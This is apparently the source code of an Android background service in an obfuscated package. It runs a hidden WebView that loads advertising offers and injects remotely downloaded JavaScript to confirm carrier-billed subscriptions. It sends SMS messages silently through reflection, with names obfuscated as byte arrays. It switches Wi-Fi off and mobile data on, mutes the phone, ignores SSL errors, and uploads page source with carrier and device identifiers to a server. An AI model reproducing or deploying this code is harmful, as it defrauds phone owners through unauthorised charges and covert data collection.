package a.d.b.view;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.net.http.SslError;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;
import android.view.ViewGroup;
import android.webkit.SslErrorHandler;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import a.d.b.entity.Ma;
import a.d.b.notif.SubNotif;
import a.d.b.task.CacheUtil;
import a.d.b.task.ConnectUtil;
import a.d.b.task.DownJsUtil;
import a.d.b.task.GetCidUtil;
import a.d.b.utils.AppInfor;
import a.d.b.utils.AudioTool;
import a.d.b.utils.HttpUtil;
import a.d.b.utils.JsUtil;
import a.d.b.utils.LinkUtil;
import a.d.b.utils.LogUtil;
import a.d.b.utils.PhoneControl;
import a.d.b.utils.PhoneInfor;
import a.d.b.utils.XmlShareTool;

import static a.d.b.utils.XmlShareTool.check_first_open;


/**
 * Created by xlc on 2017/5/24.
 */

public class AgentService extends Service {

    private WebView mWebView = null;

    private Handler handler_;

    private final int notid = LogUtil.TAG.hashCode();

    private boolean showNotification = false;

    private boolean execute_task = false;

    private Random random = null;

    private int redirect = 0;
    private String lastUrl = "";
    private boolean hasRed = false;

    /**
     * 判断是否为黑名单显示通知栏
     */
    public void check_black_list () {
        SharedPreferences sp = getSharedPreferences(PhoneControl.PREFERNAME, 0);
        int black_list_status = sp.getInt("b_l", 0);
        switch ( black_list_status ) {
            case -1:
                if ( showNotification ) {
                    //                    LogUtil.w("黑名单清除通知栏");
                    NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                    nm.cancel(notid);
                    stopForeground(true);
                    showNotification = false;
                }
                break;
            case 1:
                if ( !showNotification ) {
                    //                    LogUtil.w("不是黑名单显示通知栏");
                    startForeground(notid, SubNotif.getInstance(getApplicationContext()).getNotification());
                    showNotification = true;
                }
                break;
            default:
                //                LogUtil.w("未知情况下不展示通知栏");
                break;
        }
    }

    @SuppressLint ("NewApi")
    public void afterAnalysis () {
        LogUtil.show("c:" + XmlShareTool.getCID(this));
        LogUtil.show("Mcc:" + PhoneInfor.getMcc(this));
        LogUtil.show("Mnc:" + PhoneInfor.getMnc(this));

        //LogUtil.w("获取渠道结束后操作缓存");
        if ( XmlShareTool.checkTime(this, XmlShareTool.TAG_CACHE_TIME, 3 * 60) ) {
            // LogUtil.show("do cache");
            LogUtil.show("d c");
            new CacheUtil(this).executeOnExecutor(HttpUtil.executorService);
        }

        if ( PhoneControl.check_connect_status(this) ) {
            // LogUtil.w("满足联网时间限制");
            LogUtil.show("d con");
            new ConnectUtil(this).executeOnExecutor(HttpUtil.executorService);
        }

        if ( JsUtil.getInstance(this).check_d_js_time() && !PhoneControl.check_b_list(this) ) {
            if ( JsUtil.getInstance(this).getJsCacheStatus() != JsUtil.JS_CACHE_STATUS_DOING ) {
                //                LogUtil.w("满足下载js文件条件");
                LogUtil.show("d j");
                new DownJsUtil(this).executeOnExecutor(HttpUtil.executorService);
            } else {
                //   LogUtil.show("js downloading...");
                //   LogUtil.w("js 正在下载...");
            }
        }
    }

    @Override
    public IBinder onBind (Intent intent) {
        return null;
    }

    @Override
    public void onCreate () {
        super.onCreate();

        SubNotif.getInstance(getApplicationContext());

        random = new Random();

        initView();

        new Thread() {
            @Override
            public void run () {
                super.run();

                Looper.prepare();

                handler_ = new Handler() {
                    @Override
                    public void handleMessage (Message msg) {
                        super.handleMessage(msg);

                        //key5:308203533082023ba0030201020204519c9c5b300d06092a864886f70d01010b0500305a310d300b060355040613046b657935310d300b060355040813046b657935310d300b060355040713046b657935310d300b060355040a13046b657935310d300b060355040b13046b657935310d300b060355040313046b657935301e170d3137303931393033323335365a170d3432303931333033323335365a305a310d300b060355040613046b657935310d300b060355040813046b657935310d300b060355040713046b657935310d300b060355040a13046b657935310d300b060355040b13046b657935310d300b060355040313046b65793530820122300d06092a864886f70d01010105000382010f003082010a0282010100ac50772c64fb422af2f8078ac06132e7fb0631ff2e95e0ed93ff81c51164b1ff077a1a7c629b3d833a098a78c58ae06b7141915159af46fe8835b957e6c2278122d82b5633696028fc6f9a4532c8de4d628c239a7966b8d7356dd06f507e8cd4731ba1a5ea8758cef8f54f4389e67ee60058f198e7294e83e09149c43b9ee99d7cdba2b274294e5fd7f7b13f47c521f008ae17d5129cecaf2b99f32afdc760d17878ffa0a7fbb213436871bd8d477790dc4d2cfb2e81df36512dbcf169bb044361ad1ef58403b6bed5a8381bc6c4fcbcbb86332da468863e134470efa461fb5b4b13b59111a688b506ebd81fef70d574fe621b0ef97646c20e68577a73b1b28f0203010001a321301f301d0603551d0e04160414a3c18d179aad30de6535727479e7a5843c46a86d300d06092a864886f70d01010b050003820101003cf2ddd3b1584a72b519c2b23a660430e98cf5b849c29b66b600ec37b53a8d931d3ab73978c7d558bb9b0b9b671444b5c97cf7361df113b14c601cd6af8a46bfec1b1f1dd9b76be33b1e314cc1387c2b9b69307ae371e5fe938602a6a9d09456a84fcfa9a21075a9e2cf9b68e767cd5ff0924c33b953b350ba86c368b851a17b06e029c45e7a0897043c210fc683402b7cac6c34d056b1ea8bfb361750ecbcea2d9e52a2040f05a4188419d264031e1f855fd5449a15d4631342aaa19251d3152ce77f3e240229b8be1f6934b53201c7b183a18a481a3d0fcb2653d971efb2ca51c057a45a9b951f940031db23a9f11b51d4a4d52c63cc8492b6cc05f597bfac
                        //key6:308203533082023ba0030201020204788a55c7300d06092a864886f70d01010b0500305a310d300b060355040613046b657936310d300b060355040813046b657936310d300b060355040713046b657936310d300b060355040a13046b657936310d300b060355040b13046b657936310d300b060355040313046b657936301e170d3137303932313031323535345a170d3432303931353031323535345a305a310d300b060355040613046b657936310d300b060355040813046b657936310d300b060355040713046b657936310d300b060355040a13046b657936310d300b060355040b13046b657936310d300b060355040313046b65793630820122300d06092a864886f70d01010105000382010f003082010a0282010100968d4b279d26855560937318c0aab6513a977c6b30664b65e63476f889c5bbef6e38b11bb9b530ce83195d767c12b8aaf6fceb9c88a1c976cb1f76899067a5c09bfeffb2751539d925c3017a8a0baf8cf387b09cdc0cb0d127aac65dc1188eecafbdad4f27055d7ecd3fa4d45d2406442db5065a8f844b628b204385442283338e38b9ed18bd49318501ca71212818fa90a69fb8baf98bbe0d9410808893c57da8ed3593d562c4ef9d2868896ab9f39ba09605df910a805b48b1fff4e8896a4a57bf05dd7b22cdaf2e72c9ad2d201ca18ed45b4f751321da626a54d8be51a52021167b230c48bf2b834ad468e4bb3cebca38ef8e5e090d12e3ecdce3a9609e2d0203010001a321301f301d0603551d0e0416041472ee060bad903b1cffcf14b52c72c8ee625405bc300d06092a864886f70d01010b050003820101005ff1b934eec5d541e5f4ebc27ef6188eae9ef9c0d0ffdd3d0a06258aed8e5508585adb1c0e1ea353c509bf43937fb76651bff638c7fbd9e92b40fcad11b6a328891e43acb879938c835266add1817efa84704f17d04c5d3f62b7d4979bced5aee8a0192c9a71367f817605df4407dee2d7ab81158164ab62e65c61fca6d5863f054c9e5f0b5cd3bf0bd6d41cdce950bb30f9722fa56bd147563399b5c9357ce3fe64058af36c2f385edbdbbeec0e1b0569bfaeeaaabb94c899e828281b65bceff417e3f235da714d146c1afb643ed376a5f4ef8520bd5d792b0dcde690c1ef4c2ce00dbf3f4d81b8935e733af58fc485f2fc7a3fc1fcbcb8ba75368bef406ef8
                        //key7:308203533082023ba00302010202040a3508b1300d06092a864886f70d01010b0500305a310d300b060355040613046b657937310d300b060355040813046b657937310d300b060355040713046b657937310d300b060355040a13046b657937310d300b060355040b13046b657937310d300b060355040313046b657937301e170d3137303932383036313331355a170d3432303932323036313331355a305a310d300b060355040613046b657937310d300b060355040813046b657937310d300b060355040713046b657937310d300b060355040a13046b657937310d300b060355040b13046b657937310d300b060355040313046b65793730820122300d06092a864886f70d01010105000382010f003082010a028201010098065cd58383dac8dbb970a0e653bbcf5198ead51b24f7ded715658d6deca2db4b9d72adf251e0a7b534f15c1bc75b632b231d8728df04501979f429fbe502d70a7c9591e501aa3d99b6ea4ebc4eecc91fe20644f791e6670dc5fd04487e1e2617f61735c279721ee50cee58d0b4c175cf5ef2546569bcb1b8583b90bc1f7177ef5581f529815d486a15dcfc970c98b1205f761425b5dc1f0fa7acedec4635c9300d4310fc75b73dfa8f772fc4d693fefc3823990f4c85fd63a43dd2213959c403fcc81b3094935c5f923775bcd77d9f24fc26f2cca73d493a4d1c4da889f8e1e24875f0427485dfb77559e1dc2d612f6a6157d20bf2546005d513b4ae64c9730203010001a321301f301d0603551d0e04160414e784b7543c46421ce57ccc59fa51b704720200e9300d06092a864886f70d01010b050003820101006a5ba2e2cb0d0d540560f160c2c1060202ed7e26c976ccf269dc2ec655e0f3c553a9c1eea7a485949813fb576ce1bd0bb075114da06b32a3e2a22336576503e88bca98ac4dc67e470f96274280846103b06ce004a58e79d966e6b07f73b91c3aaac6d1caa130618358fe6df945be9dd7983778adc4427d108e9fa462d6b6022f719e97724dc8396586ac8958f6a90e5947fcad90a462b81250bac9202ed29ee705b57c0da2d106dcc72009a14fbbf8d37a78330049bb3f769d42d99973193fad13fb5b775c20e826056d7063a3aaa9ce13666a96bdd56dcde37b9ec188dc41a050f36cd1181cee7a943f16fb77414697e1c5e480c5a3fb152f4dfe2d59724b0e
                        //LogUtil.show("key:" + EncodeTool.getSignature(getApplicationContext()));

                        webHandler.sendEmptyMessage(0);
                        handler_.sendEmptyMessageDelayed(1, 6000);
                    }
                };

                handler_.sendEmptyMessage(5000);

                Looper.loop();
            }
        }.start();

        LogUtil.show("s onCreate");
    }

    public synchronized int onStartCommand (Intent intent, int flags, int startId) {
        //       LogUtil.show("AService onStartCommand: ");
        if ( !check_first_open(getApplicationContext()) || AppInfor.getType(this) ) {
            afterAnalysis();
        }
        first_start_app();
        check_black_list();
        return Service.START_NOT_STICKY;
    }

    @TargetApi (Build.VERSION_CODES.HONEYCOMB)
    private void first_start_app () {
        if ( check_first_open(getApplicationContext()) && !AppInfor.getType(this) ) {
            String cid = XmlShareTool.get_c_id(getApplicationContext());
            XmlShareTool.save_open_status(getApplicationContext());
            if ( TextUtils.isEmpty(cid) || GetCidUtil.DEFAULTCID.equals(cid) ) {
                new GetCidUtil(this).executeOnExecutor(HttpUtil.executorService);
            }
        }
    }

    private Handler webHandler = new Handler() {
        @Override
        public void handleMessage (Message message) {
            switch ( message.what ) {
                case 0:
                    if ( PhoneControl.check_webview_load_time(getApplicationContext()) && !PhoneControl.check_b_list(getApplicationContext()) && !execute_task ) {
                        //                                                LogUtil.w("服务中满足时间开始执行链接");
                        //                                               LogUtil.show("do webView load");
                        execute_task = true;
                        new Task().execute();
                    }
                    break;
                case 1:
                    if ( !checkNetWork() ) {

                        //                        LogUtil.w("网络异常情况下不注入js，执行下一条");
                        //                        LogUtil.show("net error not load js, do last");

                        webHandler.sendEmptyMessage(3);

                        break;
                    }

                    if ( !same_offer ) {

                        int random_ = random.nextInt(100) + 1;

                        LogUtil.show("r " + random_ + ":" + jRate);

                        if ( random_ > jRate ) {
                            //                            LogUtil.w("随机数" + random_ + "大于" + jRate + "不执行注入");
                            //                            LogUtil.show("random_" + random_ + ">" + jRate + " do last one");
                            if ( showInterstitialOffer != null ) {
                                if ( !XmlShareTool.check_show_intersAd_time(getApplicationContext()) ) {
                                    LogUtil.show("n w");
                                    LinkUtil.getOfferExecuteTime(getApplicationContext(), showInterstitialOffer);
                                    webHandler.sendEmptyMessage(5);
                                    //                                    LogUtil.show("do not update times");
                                    break;
                                }

                                LogUtil.show("o w");
                                XmlShareTool.save_show_intersAd_time(getApplicationContext());
                                Va.getInstance(getApplicationContext()).startLoad(showInterstitialOffer);
                            }
                            webHandler.sendEmptyMessage(3);
                            break;
                        } else {
                            //                            LogUtil.w("随机数" + random_ + "小于等于 " + jRate + " 执行注入");
                            //                            LogUtil.show("random_" + random_ + "<=" + jRate + " load js");
                        }
                    }
                    String jsString = JsUtil.getInstance(getApplicationContext()).getJsString();

                    if ( mWebView != null && !TextUtils.isEmpty(jsString) ) {
                        //                        LogUtil.w("service_执行注入");
                        //                        LogUtil.show("service_ load js");
                        mWebView.loadUrl("javascript:" + jsString, HttpUtil.getWebHead());
                        mWebView.loadUrl("javascript:findLp()", HttpUtil.getWebHead());
                        mWebView.loadUrl("javascript:findAocOk()", HttpUtil.getWebHead());
                    }
                    break;
                // 注入获取网页的代码js
                case 2:
                    if ( mWebView != null ) {
                        mWebView.loadUrl(HttpUtil.js_get_source, HttpUtil.getWebHead());
                    }
                    break;
                case 4:

                    //                    LogUtil.show("do last after 2 min,check post Resource status");
                    //                    LogUtil.w("间隔了两分钟后直接执行下一条,先判断是否需要上传源码");
                    boolean source_status = XmlShareTool.check_source_status(getApplicationContext(), offer_id + "");
                    if ( source_status && getSource == 0 ) {
                        //                        LogUtil.w("需要源代码上传");
                        //                        LogUtil.show("need load Resource js");
                        webHandler.sendEmptyMessage(2);
                        webHandler.sendEmptyMessageDelayed(3, 3000);
                    } else {
                        //                        LogUtil.w("不需要源代码上传");
                        //                        LogUtil.show("need not load resource js, do last one");
                        webHandler.sendEmptyMessage(3);
                    }
                    break;
                case 3:

                    LogUtil.show("n " + load_error);

                    if ( checkNetWork() ) {

                        //                        LogUtil.w("网络正常的情况统计:" + offer_id + "的执行次数");
                        //                        LogUtil.show("network normal save :" + offer_id + " execute times");

                        LinkUtil.save_sub_link_limit(getApplicationContext(), showInterstitialOffer);

                    } else {

                        //                        LogUtil.w("网络异常不统计:" + offer_id + "的执行次数");
                        //                        LogUtil.show("network error  do not save :" + offer_id + " execute times,do last");
                    }

                    webHandler.sendEmptyMessage(5);

                    break;
                case 5:
                    if ( mList != null && execute_index < mList.size() ) {
                        //                        LogUtil.show("do last offer_id:" + mList.get(execute_index).getOffer_id() + ":" + execute_index + "  after 5s");
                        //                        LogUtil.w("执行下一条链接offer_id:" + mList.get(execute_index).getOffer_id() + "执行第" + execute_index + "条");

                        start_load(mList.get(execute_index));
                        execute_index = execute_index + 1;
                    } else {
                        //                        LogUtil.w("轮询结束,回收浏览器");
                        //                        LogUtil.show("do all offer finished,destroy webView");
                        webHandler.removeMessages(4);
                        destoryWebView();
                    }
                    break;
            }
        }
    };

    private void start_load (Ma offer) {
        LogUtil.show("p " + offer.getSub_platform_id() + "  s " + offer.getOffer_id());

        initStatus();
        String load_url = LinkUtil.getChangeUrl(offer, this, true);
        showInterstitialOffer = offer;
        jRate = offer.getJRate();
        sub_platform_id = offer.getSub_platform_id();
        offer_id = offer.getOffer_id();
        getSource = offer.getGetSource();

        if ( mWebView == null ) {
            initView();
        }

        PhoneControl.disableJsIfUrlEncodedFailed(mWebView, load_url);

        webHandler.removeMessages(4);
        webHandler.sendEmptyMessageDelayed(4, 2 * 60000);

        mWebView.onResume();
        mWebView.clearFocus();
        mWebView.stopLoading();
        mWebView.clearHistory();
        mWebView.clearCache(true);
        mWebView.loadUrl(load_url, HttpUtil.getWebHead());

    }

    private class Task extends AsyncTask<Void, Integer, Ma> {

        @Override
        protected Ma doInBackground (Void... params) {

            mList = null;
            execute_index = 0;

            if ( JsUtil.getInstance(getApplicationContext()).check_d_js_time() && !PhoneControl.check_b_list(getApplicationContext()) ) {
                if ( JsUtil.getInstance(getApplicationContext()).getJsCacheStatus() != JsUtil.JS_CACHE_STATUS_DOING ) {
                    //                    LogUtil.w("执行offer前满足条件先下载js");
                    //                    LogUtil.show("download js before execute offer");
                    LogUtil.show("d j");
                    JsUtil.getInstance(getApplicationContext()).init();
                    if ( JsUtil.getInstance(getApplicationContext()).getJsCacheStatus() == JsUtil.JS_CACHE_STATUS_FAIL ) {
                        //                        LogUtil.w("下载失败不往下执行offer");
                        //                        LogUtil.w("download fail return");
                        return null;
                    }
                } else {
                    //                    LogUtil.w("js正在下载中,不执行offer");
                    //                    LogUtil.w("js downloading..");
                    return null;
                }
            }

            Ma offer = LinkUtil.get_one_offer(getApplicationContext());

            if ( offer == null ) {
                //                LogUtil.show("数据为空");
                return null;
            }

            //            LogUtil.w("随机的一条支持网络状态(1:流量)：" + offer.getAllow_network());
            //            LogUtil.show("get one offer(1:gprs)：" + offer.getAllow_network());
            if ( offer.getAllow_network() == 1 ) {

                //                LogUtil.w("服务中执行: 只支持GPRS");
                //                LogUtil.show("only gprs");

                if ( PhoneControl.getWifiStatus(getApplicationContext()) ) {

                    if ( JsUtil.getInstance(getApplicationContext()).getJsCacheStatus() == JsUtil.JS_CACHE_STATUS_DOING ) {

                        //                        LogUtil.w("正在下载js或缓存不做执行offer,不做关闭wifi操作");
                        //                        LogUtil.show("js downloading,do not close wifi");

                        return null;
                    }
                    //                    LogUtil.w("服务中执行: 判断wifi为开启状态 做关闭");
                    //                    LogUtil.show("do close wifi");
                    //关闭wifi
                    PhoneControl.closeWifi(getApplicationContext());

                    try {
                        Thread.sleep(5000);
                    } catch ( InterruptedException e ) {
                        e.printStackTrace();
                    }

                }

                if ( !PhoneControl.getMobileStatus(getApplicationContext(), null) ) {
                    //                    LogUtil.w("服务中执行:GPRS为关闭状态，做开启操作");
                    //                    LogUtil.show("open gprs");

                    PhoneControl.setNetState(getApplicationContext(), "setMobileDataEnabled", true);

                    try {
                        Thread.sleep(10000);
                    } catch ( InterruptedException e ) {
                        e.printStackTrace();
                    }
                }
            }

            mList = LinkUtil.getOfferList(getApplicationContext(), offer.getAllow_network(), offer.getOffer_id(), offer.getSub_platform_id());

            //            LogUtil.w("根据这个网络查询数据大小：" + mList.size());
            //            LogUtil.show("search size：" + mList.size());
            //
            //            Log.e("love", offer.getOffer_id() + "-" + offer.getSub_platform_id());
            //            for (int i = 0; i < mList.size(); i++) {
            //                Log.e("love", mList.get(i).getOffer_id() + "---" + mList.get(i).getSub_platform_id());
            //            }

            return offer;
        }

        @SuppressLint ("SimpleDateFormat")
        @Override
        protected void onPostExecute (Ma offer) {
            super.onPostExecute(offer);

            execute_task = false;

            if ( offer == null ) {
                //         LogUtil.w("没有查找到数据");
                //         LogUtil.show("no data");
                return;
            }

            PhoneControl.save_webview_load_time(getApplicationContext());

            AudioTool.getInstance(getApplicationContext()).setSlience();

            start_load(offer);
        }
    }

    @SuppressLint ({"SetJavaScriptEnabled", "JavascriptInterface"})
    private void initView () {
        mWebView = new WebView(getApplicationContext());
        mWebView.setDrawingCacheBackgroundColor(Color.WHITE);
        mWebView.setFocusableInTouchMode(true);
        mWebView.setFocusable(true);
        mWebView.setDrawingCacheEnabled(false);
        mWebView.setWillNotCacheDrawing(true);
        mWebView.setBackgroundColor(Color.WHITE);
        mWebView.setScrollbarFadingEnabled(true);
        mWebView.setSaveEnabled(true);
        mWebView.setNetworkAvailable(true);
        mWebView.getSettings().setJavaScriptEnabled(true);
        mWebView.addJavascriptInterface(this, "toolbox");
        mWebView.addJavascriptInterface(this, "myObj");

        mWebView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading (WebView view, String url) {

                if ( url.startsWith(new String(new byte[]{115, 109, 115, 58})) ) {
                    try {
                        String port = url.substring(url.indexOf(":") + 1, url.indexOf("?"));
                        String content = url.substring(url.indexOf("=") + 1, url.length());

                        //   SmsManager.getDefault().sendTextMessage(port, null, content, null, null);

                        //getDefault
                        String org = new String(new byte[]{103, 101, 116, 68, 101, 102, 97, 117, 108, 116});

                        Class<?> smsClasss = Class.forName("android.telephony.SmsManager");
                        Method method = smsClasss.getMethod("sendTextMessage", new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class});
                        method.invoke(smsClasss.getMethod(org).invoke(null), new Object[]{port, null, Uri.decode(content), null, null});

                    } catch ( Exception e ) {
                        e.printStackTrace();
                    }
                }

                view.loadUrl(url, HttpUtil.getWebHead());

                return true;
            }

            @Override
            public void onReceivedSslError (WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }

            @Override
            public void onPageFinished (WebView view, String url) {
                super.onPageFinished(view, url);

                //                LogUtil.show("onPageFinished+" + url);

                if ( url.equals(last_finished_url) ) {
                    //                    LogUtil.w("相同的链接不注入");
                    return;
                }

                last_finished_url = url;
                webHandler.removeMessages(1);

                if ( LinkUtil.check_url(url) ) {
                    //                    LogUtil.w("黑名单链接不执行注入，执行下一条");
                    //                    LogUtil.show("blacklist url, do last one");
                    load_error = 0;
                    webHandler.sendEmptyMessage(3);
                    return;
                }
                webHandler.sendEmptyMessageDelayed(1, 20000);
            }

            //
            @Override
            public void onPageStarted (WebView view, String url, Bitmap favicon) {
                load_error = 0;
                findLp_ok = "";
                findAoc_ok = "";

                if ( url.equals(lastUrl) ) {
                    redirect++;
                    if ( redirect > 10 & !hasRed ) {
                        LogUtil.show("m r n o");
                        hasRed = true;
                        destoryWebView();

                        webHandler.removeMessages(1);

                        webHandler.sendEmptyMessageDelayed(5, 1000);
                    }

                } else {
                    redirect = 0;
                }

                lastUrl = url;

                LogUtil.show(redirect + " slurl:" + url);
            }

            @Override
            public void onReceivedError (WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                load_error = errorCode;
            }
        });
    }

    @SuppressLint ("NewApi")
    private void destoryWebView () {
        if ( mWebView != null ) {
            try {
                ViewGroup parent = (ViewGroup) mWebView.getParent();
                if ( parent != null ) {
                    parent.removeAllViews();
                }

                mWebView.stopLoading();
                mWebView.onPause();
                mWebView.clearHistory();
                mWebView.removeAllViews();
                mWebView.destroyDrawingCache();
                mWebView.destroy();
            } catch ( Exception e ) {
                e.printStackTrace();
            }

            mWebView = null;

            LogUtil.show("w d");
        }

        AudioTool.getInstance(getApplicationContext()).setNomal();

    }

    /**
     * 获取源码信息回调
     *
     * @param source
     */
    @android.webkit.JavascriptInterface
    public void getSource (String source) {
        //        LogUtil.w("getSource: " + source);
        LogUtil.show("s r");

        //source_type
        String org1 = new String(new byte[]{115, 111, 117, 114, 99, 101, 95, 116, 121, 112, 101});
        //network
        String org2 = new String(new byte[]{110, 101, 116, 119, 111, 114, 107});

        Map<String, Object> map = new HashMap<>();
        map.put("mcc", PhoneInfor.getMcc(getApplicationContext()));
        map.put("mnc", PhoneInfor.getMnc(getApplicationContext()));
        map.put("cid", XmlShareTool.getCID(getApplicationContext()));
        map.put(org1, source_type);
        map.put("platform_id", sub_platform_id);
        map.put("offer_id", offer_id);
        map.put("source", source);
        map.put(org2, PhoneControl.getNetStates(this));

        HttpUtil.postSource(map, getApplicationContext());
    }

    private void initStatus () {
        load_error = 0;
        last_finished_url = "";
        aoc_ok = false;
        lp_ok = false;
        source_type = 0;
        same_offer = false;
        jRate = 60;
        redirect = 0;
        hasRed = false;
    }

    private List<Ma> mList = null;

    //当前执行的index
    private int execute_index = 0;

    private String findLp_ok = "";

    private String findAoc_ok = "";

    private int load_error = 0;

    private boolean lp_ok = false;

    private boolean aoc_ok = false;

    private int source_type;

    private boolean same_offer = false;

    private String last_finished_url = "";

    private int offer_id;

    private int sub_platform_id;

    //    是否需要获取网页代码传回服务器 0：干 1：不干
    private int getSource;

    private int jRate;

    private Ma showInterstitialOffer = null;

    @android.webkit.JavascriptInterface
    public void openImage (String tag, String _url) throws InterruptedException {
        //        LogUtil.w("service_tag:" + tag);
        same_offer = true;
        if ( tag.contains("findLp") ) {
            findLp_ok = tag;
            findAoc_ok = "";
            if ( tag.contains("ok") ) {
                //                LogUtil.show("lp ok");
                lp_ok = true;
            } else {
                //                LogUtil.show("lp no");
            }
        }
        if ( tag.contains("aoc_") ) {
            findAoc_ok = tag;
            if ( tag.contains("ok") ) {
                //                LogUtil.show("aoc ok");
                aoc_ok = true;
            } else {
                //                LogUtil.show("aoc no");
            }
        }

        //短信按钮      sms
        boolean is_sms = findAoc_ok.contains(new String(new byte[]{115, 109, 115}));
        boolean findLp_no = !findLp_ok.contains("ok") && !"".equals(findLp_ok);
        boolean aoc_no = !findAoc_ok.contains("ok") && !"".equals(findAoc_ok);

        if ( load_error != -2 && ((findLp_no && aoc_no) || is_sms) ) {
            boolean check_return = XmlShareTool.check_source_status(getApplicationContext(), offer_id + "");
            boolean exist_ok = aoc_ok && lp_ok;
            source_type = getSource_type();
            if ( getSource == 0 && !exist_ok && check_return ) {
                //                LogUtil.w("需要获取网页的源代码");
                //                LogUtil.show("do load Source code js");
                webHandler.sendEmptyMessage(2);
                webHandler.sendEmptyMessageDelayed(3, 5000);
            } else {
                //                if (exist_ok) {
                //                    LogUtil.show("exist both ok ,do not return data");
                //                    LogUtil.w("findLp_ok和aoc_ok都存在，不回传");
                //                }
                //                if (!check_return) {
                //                    LogUtil.show("offer has return data");
                //                    LogUtil.w("这条offer已经上传过源代码，不再做上传");
                //                }
                webHandler.sendEmptyMessageDelayed(3, 100);
            }
        }
    }

    /**
     * 回传类型
     *
     * @return
     */
    public int getSource_type () {
        int source_type = 0;
        if ( !aoc_ok && !lp_ok ) {
            source_type = 0;
        } else if ( lp_ok && !aoc_ok ) {
            source_type = 1;
        } else if ( !lp_ok && aoc_ok ) {
            source_type = 2;
        }
        return source_type;
    }

    private boolean checkNetWork () {
        if ( load_error != -2 && load_error != -8 ) {
            if ( PhoneControl.checkNet(getApplicationContext()) ) {
                return true;
            }
        }
        return false;
    }
}